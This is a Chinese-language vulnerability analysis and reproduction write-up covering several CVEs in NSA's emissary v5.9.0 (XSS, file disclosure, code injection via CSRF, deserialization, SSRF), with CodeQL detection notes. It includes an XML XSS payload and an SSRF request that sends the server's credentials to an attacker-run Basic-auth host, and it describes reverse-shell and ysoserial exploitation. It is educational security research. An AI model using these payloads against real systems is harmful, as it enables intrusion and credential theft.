# NSA emissary多个漏洞分析复现和CodeQL实践

## 0x00 前言

先是Sonarsource的安全研究员在审计NSA的开源项目emissary v5.9.0版本的过程中发现了若干漏洞，其中包括：
- Code Injection (CVE-2021-32096)
- Arbitrary File Upload (CVE-2021-32094)
- Arbitrary File Disclosure (CVE-2021-32093)
- Arbitrary File Delete (CVE-2021-32095)
- Reflected cross-site scripting (CVE-2021-32092)

后来在浏览Github安全实验室的博客时，看到@pwntester在Sonarsource安全研究员的基础上，使用CodeQL编写规则，在emissary项目中除了检测出以上漏洞外，还发现了新的漏洞：
- Unsafe deserialization (CVE-2021-32634)
- Server-side request forgery (CVE-2021-32639)

最近笔者除了在做漏洞分析外，也在学习CodeQL的使用，刚好可以用emissary项目来练手。

## 0x01 漏洞分析和复现

### Reflected cross-site scripting (CVE-2021-32092)

这个XSS漏洞发生在一个文档上传功能里，上传文档后通过`/emissary/Document.action/{uuid}`接口来获取文档的信息，`uuid`参数对应的不同的文档。当`uuid`不存在时，返回一个`XML`格式的内容，提示`uuid`不存在, 但传入的`uuid`参数未经任何的安全过滤就原样显示在回显文本中，可导致反射型XSS。关键代码如下图：

<img src="pic/emissary_1.png">

由于返回的文本是XML格式，可在[XSS-Cheat-Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)中找到在XML文件中执行的PoC，如下：

```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

<img src="pic/emissary_2.png">


### Arbitrary File Disclosure (CVE-2021-32093) 

漏洞发生在接口`/emissary/ConfigFile.action`，该接口没有对传入的参数`ConfigItem`做任何安全校验和过滤，导致可读取服务器上任意文件。关键代码如下：

<img src="pic/emissary_3.png">

<img src="pic/emissary_4.png">

示例如下，读取系统文件，及读取emissary的配置文件获取用户名/密码：

<img src="pic/emissary_5.png">

<img src="pic/emissary_6.png">


### Code Injection (CVE-2021-32096)

该漏洞出现在接口`/emissary/Console.action`，该接口允许用户执行Ruby代码。关键代码如下：

<img src="pic/emissary_8.png">

<img src="pic/emissary_9.png">

<img src="pic/emissary_10.png">

严格来说，这个是emissary提供的功能。另外，该接口需要登录后才能调用。但由于emissary的用户认证使用的是HTTP摘要认证(HTTP Digest authentication)(参考[3])，在浏览器端登录后的HTTP请求，会自动带上请求头`Authorization`，如下：

```
GET / HTTP/1.1
Host: 192.168.3.56:8001
Authorization: Digest username="emissary", realm="EmissaryRealm", nonce="6GNGeEbPjv0BCgLtxLiqHifkF1eNRMM3", uri="/", algorithm=MD5, response="daa5a9a9144b7665f5ff1f5585d3432f", qop=auth, nc=00000001, cnonce="9f3c3b06c42dba3b"
```

这种认证方式可以被CSRF攻击。所以可构造页面让登录用户去访问，然后获取反弹shell，如下图演示：

<img src="pic/emissary_7.gif">


### Unsafe deserialization (CVE-2021-32634)

该漏洞发生在接口`/emissary/WorkSpaceClientEnqueue.action`，代码如下图：

<img src="pic/emissary_11.png">

可以看到参数`WorkSpaceAdapter.WORK_BUNDLE_OBJ`在第52、53行被读取并反序列化。而且emissary依赖了`commons-collections-3.2.1`，所以可以使用`ysoserial`生成`CC`链的payload进行反序列化攻击。由于这个接口也是登录后才可调用，因此可配合CSRF进行利用。

### Server-side request forgery (CVE-2021-32639)

这里有两个接口存在SSRF漏洞，分别是`/emissary/RegisterPeer.action`和`/emissary/AddChildDirectory.action`。

这两处SSRF漏洞，使用CodeQL的默认规则集可以检测出来，如图：

<img src="pic/emissary_12.png">

<img src="pic/emissary_13.png">

#### 接口 /RegisterPeer.action

漏洞输入点在`directoryName`参数。

可构造payload如下：
```
POST /emissary/RegisterPeer.action HTTP/1.1
Host: 127.0.0.1:8001
Content-Type: application/x-www-form-urlencoded

directoryName=foo.bar.baz.http://172.20.10.3:5000/&targetDir=http://localhost:8001/DirectoryPlace
```

SSRF一般用于未授权访问、扫描或攻击目标的内部网络。但是这里@pwntester根据emissary的实际情况给出了另一种攻击场景。通过分析代码发现，emissary使用Apache的HttpClient库来向内部网络发起http请求，它从自身配置中获取身份凭证，并将身份凭证设置到名为`CRED_PROV`的凭证提供者对象中，然后带着这个身份凭证向目标服务发起Http请求。在这个过程中，并没有配置emissary客户端使用哪种身份认证机制(`HTTP Basic Authentication`或`HTTP Digest Authentication`)，所以判断：使用哪种身份认证机制应该是根据HTTP服务器的响应来决定的。具体代码如下：

<img src="pic/emissary_15.png">

因此，我们就可以架设一个HTTP基础认证的服务器，然后通过emissary的SSRF漏洞，让emissary客户端使用HTTP基础认证方式去访问我们的服务器，这样，我们在恶意服务器端就能获取用户身份凭证的明文数据(Base64编码)。

经实践，确实是这样。<br>
1、首先编写并启动我们的HTTP Basic Authentication服务器；<br>
2、使用上面的payload，对emissary执行SSRF攻击，如下图，会带着身份凭证的明文数据(Base64编码)向我们的目标服务器发起请求: <br>

<img src="pic/emissary_14.png">

因此emissary项目的维护者在修复SSRF漏洞的同时，还指定了emissary客户端使用HTTP摘要认证机制。如下图，详见：[修复代码](https://github.com/NationalSecurityAgency/emissary/commit/79ca5608c4f77d9a5c8a4996e204377c158a6976#diff-c988041bf4d686dbcce23218e54188558f0116513ff30d161d958482a7c5f1c4)

<img src="pic/emissary_16.png">

#### 接口 /AddChildDirectory.action

`/AddChildDirectory.action`接口同理，就不展开说了。



## Reference

[1] https://blog.sonarsource.com/code-vulnerabilities-in-nsa-application-revealed <br>
[2] https://securitylab.github.com/research/NSA-emissary/ <br>
[3] https://blog.csdn.net/andrewpj/article/details/45727853